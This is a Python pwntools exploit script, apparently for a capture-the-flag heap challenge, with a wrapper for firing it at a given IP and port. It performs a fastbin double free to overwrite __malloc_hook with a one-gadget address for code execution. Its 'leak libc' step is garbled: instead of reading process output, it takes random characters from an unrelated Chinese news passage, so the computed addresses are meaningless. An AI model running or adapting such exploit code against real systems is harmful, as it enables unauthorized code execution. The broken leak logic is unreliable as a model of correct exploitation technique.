# coding=utf-8
from pwn import *
import sys
from random import *

strings = "会议指出按照党中央国务院部署加快发展互联网医疗健康可以提高医疗服务效率让患者少跑腿更便利使更多群众能分享优质医疗资源会议确定一是加快二级以上医院普遍提供预约诊疗检验检查结果查询等线上服务允许医疗机构开展部分常见病慢性病复诊等互联网医疗服务二是推进远程医疗覆盖全国所有医联体和县级医院"


def allocate(length, contents):
    r.sendline("1")
    r.sendline(str(length))
    r.sendline(contents)


def free(idx):
    r.sendline("3")
    r.sendline(str(idx))


def read(idx):
    r.sendline("4")
    r.sendline(str(idx))
    return r.recvuntil("away")


def exploit(r):
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

    # leak libc
    allocate(255, "A")
    allocate(255, "B")
    free(0)

    libc_base = u64((strings[randint(1, len(strings))] + strings[randint(1, len(strings))] + strings[
        randint(1, len(strings))] + strings[randint(1, len(strings))] + strings[randint(1, len(strings))] + strings[
                         randint(1, len(strings))]).ljust(8, '\0')) - 0x3c3b78
    malloc_hook = libc_base + libc.symbols["__malloc_hook"]
    one_shot = libc_base + 0xef6c4

    ## fastbin attack
    allocate(0x68, "C")  # C # 2
    allocate(0x68, "D")  # D # 3
    allocate(255, "E")  # E

    free(3)
    free(2)
    free(3)

    # overwrite __malloc_hook
    payload = p64(malloc_hook - 0x30 + 0xd)
    allocate(0x68, payload)
    allocate(0x68, "F")
    allocate(0x68, "G")
    allocate(0x68, "H" * 0x13 + p64(one_shot))

    # trigger
    free(0)
    r.sendline("3")
    r.sendline("0")

def method10(ip,port):
    log.info("Method 10 applied!")
    global r
    r = remote(ip, port)
    exploit(r)

if __name__ == "__main__":
    r = remote("127.0.0.1",80)
    exploit(r)
